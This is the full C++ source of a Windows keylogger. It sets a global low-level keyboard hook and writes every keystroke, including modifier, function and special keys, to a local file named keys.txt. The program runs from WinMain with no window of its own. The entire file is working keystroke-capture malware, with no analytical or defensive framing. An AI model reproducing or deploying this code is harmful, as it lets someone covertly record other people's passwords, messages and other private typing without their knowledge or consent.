#include <windows.h>
#include <fstream>
#include <string>

static char key_file[] = "keys.txt"; //LOG FILE name

void WriteToLog(std::string s)
{
	std::ofstream log_file(key_file, std::ios::app); //opens log file
	log_file << s << " "; //writes to log file
	log_file.close(); //closes log file
}

BOOL CapsLock()
{
	// lower bit for CapsLock
	if (GetKeyState(VK_CAPITAL) & 0x0001)
		return true;
	else
		return false;
}

BOOL Ctrl() // if Ctrl is on
{
	if (((GetKeyState(VK_CONTROL) & 0x8000) >> 15)
		|| ((GetKeyState(VK_LCONTROL) & 0x8000) >> 15)
		|| ((GetKeyState(VK_RCONTROL) & 0x8000) >> 15)) // higher bit
		
		return true;
	else
		return false;
}

BOOL Shift() // if Shift is on
{
	if (((GetKeyState(VK_SHIFT) & 0x8000) >> 15)
		|| ((GetKeyState(VK_LSHIFT) & 0x8000) >> 15)
		|| ((GetKeyState(VK_RSHIFT) & 0x8000) >> 15)) // higher bit
		
		return true;
	else
		return false;
}

BOOL NumLock() // if NumLock key is on
{
	if (GetKeyState(VK_NUMLOCK) & 0x0001) // lower bit
		return true;
	else
		return false;
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) // to be run for hooking the key
{ 
	if (wParam == WM_SYSKEYDOWN) // if alt is down
	{
		WriteToLog("ALT + Key");
	}

	if (wParam == WM_KEYDOWN) // if key is down
	{
		//get the key from lParam
		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
		
		if (Ctrl())
			WriteToLog("CTRL +");

		if (Shift())
			WriteToLog("SHIFT +");
		
		if (NumLock())
			WriteToLog("NUM +");
		
		if ((key->vkCode >= 0x30 && key->vkCode <= 0x39)
			|| (key->vkCode >= 0x41 && key->vkCode <= 0x5A))
		{
			UINT scan_code = MapVirtualKey(key->vkCode, 0);
			scan_code <<= 16; //shift 16 bits
			char key_name[16];
			GetKeyNameTextA(scan_code,key_name,16); // copies scan_code to key_name
			WriteToLog(key_name);
		}

		if (key->vkCode >= 0x70 && key->vkCode <= 0x87) // F1 ~ F24
		{
			WriteToLog("F +");
			WriteToLog(std::to_string(key->vkCode - 111));
		}

		if (key->vkCode >= 0x60 && key->vkCode <= 0x69 && NumLock())
		{
			WriteToLog("Num");
			WriteToLog(std::to_string(key->vkCode - 95));
		}

		switch (key->vkCode) 
		{
		case VK_CANCEL:		WriteToLog("CTRLBREAK");	break;
		case VK_BACK:		WriteToLog("BACKSPACE");	break;
		case VK_TAB:		WriteToLog("TAB");			break;
		case VK_CLEAR:		WriteToLog("CLEAR");		break;
		case VK_RETURN:		WriteToLog("ENTER");		break;
		case VK_PAUSE:		WriteToLog("PAUSE");		break;
		case VK_ESCAPE:		WriteToLog("ESCAPE");		break;
		case VK_SPACE:		WriteToLog("SPACE");		break;
		case VK_PRIOR:		WriteToLog("PAGEUP");		break;
		case VK_NEXT:		WriteToLog("PAGEDOWN");		break;
		case VK_END:		WriteToLog("END");			break;
		case VK_HOME:		WriteToLog("HOME");			break;
		case VK_LEFT:		WriteToLog("LEFT");			break;
		case VK_UP:			WriteToLog("UP");			break;
		case VK_RIGHT:		WriteToLog("RIGHT");		break;
		case VK_DOWN:		WriteToLog("DOWN");			break;
		case VK_SELECT:		WriteToLog("SELECT");		break;
		case VK_PRINT:		WriteToLog("PRINT");		break;
		case VK_EXECUTE:	WriteToLog("EXECUTE");		break;
		case VK_SNAPSHOT:	WriteToLog("PRINTSCR");		break;
		case VK_INSERT:		WriteToLog("INSERT");		break;
		case VK_DELETE:		WriteToLog("DELETE");		break;
		case VK_LWIN:		WriteToLog("LEFTWIN +");	break;
		case VK_RWIN:		WriteToLog("RIGHTWIN +");	break;
		case VK_APPS:		WriteToLog("APPSKEY");		break;
		case VK_SLEEP:		WriteToLog("SLEEP");		break;
		case 0xBA:			WriteToLog(";");			break;
		case 0xBB:			WriteToLog("=");			break;
		case 0xBC:			WriteToLog(",");			break;
		case 0xBD:			WriteToLog("-");			break;
		case 0xBE:			WriteToLog(".");			break;
		case 0xBF:			WriteToLog("/");			break;
		case 0xC0:			WriteToLog("`");			break;
		case 0xDB:			WriteToLog("[");			break;
		case 0xDC:			WriteToLog("\\");			break;
		case 0xDD:			WriteToLog("]");			break;
		case 0xDE:			WriteToLog("'");			break;
		case VK_MULTIPLY:	WriteToLog("Num *");		break;
		case VK_ADD:		WriteToLog("Num +");		break;
		case VK_SEPARATOR:	WriteToLog("Num ,");		break;
		case VK_SUBTRACT:	WriteToLog("Num -");		break;
		case VK_DECIMAL:	WriteToLog("Num .");		break;
		case VK_DIVIDE:		WriteToLog("Num /");		break;
		case VK_CAPITAL:	WriteToLog("CAPSLOCK");		break;
		case VK_SCROLL:		WriteToLog("SCROLLLOCK");	break;
		case VK_NUMLOCK:	WriteToLog("NUM");			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void MsgLoop()
{
    MSG message;
	while (GetMessage(&message,NULL,0,0))
    {
		TranslateMessage(&message);
		DispatchMessage(&message);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HHOOK keyboard_hook;
	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInstance, 0); // sets hook
    MsgLoop(); //prevents from closing
    UnhookWindowsHookEx(keyboard_hook); //unhooks
    return 0;
}